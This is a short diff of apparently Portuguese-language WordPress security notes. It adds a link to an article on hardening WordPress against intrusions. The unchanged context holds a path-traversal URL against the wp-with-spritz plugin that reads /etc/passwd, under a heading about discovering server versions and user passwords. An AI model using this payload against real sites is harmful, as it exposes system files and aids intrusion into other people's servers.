@@ -28,6 +28,10 @@ add_filter( 'rest_endpoints', function( $endpoints ){
 Descobrir possivel versão do servidor web e senha de usuarios:
 
 https://dominio.x.x//wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
+    
+# Como blindar o wordpress contra invasões:
+    
+https://pt.semrush.com/blog/como-blindar-o-seu-wordpress-contra-invasoes-evitando-perder-posicoes-no-google-passo-a-passo/
 
 
 
